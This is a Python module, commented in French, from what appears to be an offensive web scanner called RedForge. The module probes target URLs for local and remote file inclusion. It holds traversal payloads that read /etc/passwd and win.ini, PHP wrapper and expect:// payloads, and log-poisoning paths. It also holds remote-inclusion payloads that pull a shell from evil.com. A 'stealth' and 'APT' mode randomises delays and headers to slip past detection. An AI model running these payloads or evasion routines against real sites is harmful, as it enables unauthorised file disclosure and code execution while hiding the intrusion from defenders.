#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection LFI/RFI pour RedForge
Détecte les vulnérabilités d'inclusion de fichiers locaux et distants
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.core.stealth_engine import StealthEngine


class LFIScanner:
    """Scanner avancé d'inclusion de fichiers avec support furtif"""
    
    def __init__(self):
        # Payloads LFI
        self.lfi_payloads = [
            # Basic traversal
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            # Encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%2565%2565%2566..%2565%2565%2566etc%2565%2565%2566passwd",
            # Windows
            "../../../../windows/win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-decode/resource=index.php",
            "php://filter/zlib.deflate/resource=index.php",
            "php://input",
            "expect://id",
            # Null byte (old PHP)
            "../../../../etc/passwd%00",
            "../../../../etc/passwd\\0",
            # Path traversal variants
            "/etc/passwd",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            # Double traversal
            "..././..././..././etc/passwd",
            "..;/..;/..;/etc/passwd",
            # Log poisoning
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/nginx/access.log"
        ]
        
        # Payloads RFI
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.php",
            "//evil.com/shell.txt",
            "http://evil.com/shell.txt?",
            "http://evil.com/shell.txt%00",
            "http://evil.com/shell.txt%23",
            "ftp://evil.com/shell.txt",
            "https://evil.com/shell.php?cmd=id",
            "http://evil.com/shell.txt?anything="
        ]
        
        # Signatures de détection
        self.success_signatures = {
            "etc_passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:', r'/bin/bash'],
            "win_ini": [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
            "php_source": [r'<\\?php', r'define\\s*\\(', r'function\\s+\\w+\\s*\\(', r'class\\s+\\w+'],
            "base64": [r'^[A-Za-z0-9+/]{40,}={0,2}$'],
            "shadow": [r'root:\\$.*:\\d+:\\d+:::'],
            "hosts": [r'127\\.0\\.0\\.1\\s+localhost'],
            "env": [r'PATH=', r'HOME=', r'USER=']
        }
        
        # Moteur de furtivité
        self.stealth_engine = StealthEngine()
        self.stealth_mode = False
        self.apt_mode = False
    
    def set_stealth_config(self, config: Dict[str, Any]):
        """
        Configure le mode furtif
        
        Args:
            config: Configuration de furtivité
        """
        self.stealth_mode = config.get('enabled', False)
        self.apt_mode = config.get('apt_mode', False)
        
        if self.stealth_mode:
            self.stealth_engine.set_delays(
                min_delay=config.get('delay_min', 1),
                max_delay=config.get('delay_max', 5),
                jitter=config.get('jitter', 0.3)
            )
            if self.apt_mode:
                self.stealth_engine.enable_apt_mode()
    
    def _apply_stealth_delay(self):
        """Applique un délai furtif"""
        if self.stealth_mode:
            self.stealth_engine.apply_delay()
    
    def _get_headers(self) -> Dict[str, str]:
        """Génère des headers furtifs"""
        if self.stealth_mode:
            return self.stealth_engine.get_headers()
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités LFI/RFI
        
        Args:
            target: URL cible
            **kwargs:
                - params: Paramètres spécifiques à tester
                - rfi: Activer le scan RFI
                - depth: Profondeur de traversal
        """
        print(f"  → Scan des inclusions de fichiers (LFI/RFI)")
        if self.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        tested_params = set()
        
        # Identifier les paramètres à tester
        params_to_test = self._get_params_to_test(target, kwargs)
        test_rfi = kwargs.get('rfi', True) and not self.apt_mode  # Pas de RFI en mode APT
        depth = kwargs.get('depth', 5)
        
        # Limiter les payloads en mode APT
        lfi_payloads = self.lfi_payloads[:30] if self.apt_mode else self.lfi_payloads
        
        for param in params_to_test:
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Test LFI
            lfi_found = False
            for payload in lfi_payloads:
                self._apply_stealth_delay()
                result = self._test_lfi(target, param, payload, depth)
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "type": "lfi",
                        "severity": "HIGH",
                        "evidence": result['evidence'],
                        "file_type": result.get('file_type', 'unknown'),
                        "risk_score": 85
                    })
                    print(f"      ✓ LFI trouvée: {param} -> {payload[:40]}...")
                    lfi_found = True
                    break
            
            # Test RFI (si pas déjà trouvé et mode normal)
            if test_rfi and not lfi_found:
                for payload in self.rfi_payloads[:10]:
                    self._apply_stealth_delay()
                    result = self._test_rfi(target, param, payload)
                    
                    if result['vulnerable']:
                        vulnerabilities.append({
                            "parameter": param,
                            "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                            "type": "rfi",
                            "severity": "CRITICAL",
                            "evidence": result['evidence'],
                            "risk_score": 95
                        })
                        print(f"      ✓ RFI trouvée: {param} -> {payload[:40]}...")
                        break
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "lfi_count": len([v for v in vulnerabilities if v['type'] == 'lfi']),
            "rfi_count": len([v for v in vulnerabilities if v['type'] == 'rfi']),
            "stealth_mode": self.stealth_mode,
            "apt_mode": self.apt_mode,
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['file', 'page', 'view', 'load', 'include', 'path', 'doc', 
                     'document', 'folder', 'root', 'dir', 'directory', 'filename',
                     'template', 'theme', 'lang', 'language']
        
        # Limiter en mode APT
        if self.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_lfi(self, target: str, param: str, payload: str, depth: int) -> Dict[str, Any]:
        """Teste un payload LFI"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'file_type': None
        }
        
        # Générer des variations de profondeur
        variants = []
        for d in range(1, depth + 1):
            variant = payload.replace('../' * 3, '../' * d)
            variants.append(variant)
        variants.append(payload)
        
        for test_payload in set(variants):
            parsed = urlparse(target)
            query_params = parse_qs(parsed.query)
            
            if param in query_params:
                query_params[param] = [test_payload]
            else:
                query_params[param] = [test_payload]
            
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            try:
                headers = self._get_headers()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Vérifier les signatures
                for sig_type, patterns in self.success_signatures.items():
                    for pattern in patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            result['vulnerable'] = True
                            result['evidence'] = pattern
                            result['file_type'] = sig_type
                            return result
                
                # Détection de base64 (wrapper PHP)
                if 'base64' in test_payload:
                    if re.match(r'^[A-Za-z0-9+/]+={0,2}$', response.text.strip()):
                        try:
                            decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                            if any(p in decoded for p in ['<?php', 'define', 'function']):
                                result['vulnerable'] = True
                                result['evidence'] = 'base64_decode'
                                result['file_type'] = 'php_source'
                                return result
                        except:
                            pass
                
                # Vérifier les erreurs PHP
                php_errors = [
                    'failed to open stream',
                    'file_get_contents',
                    'include_once',
                    'require_once',
                    'Warning: include(',
                    'Fatal error:',
                    'No such file',
                    'Unable to open'
                ]
                
                for error in php_errors:
                    if error.lower() in response.text.lower():
                        result['vulnerable'] = True
                        result['evidence'] = error
                        return result
                        
            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass
        
        return result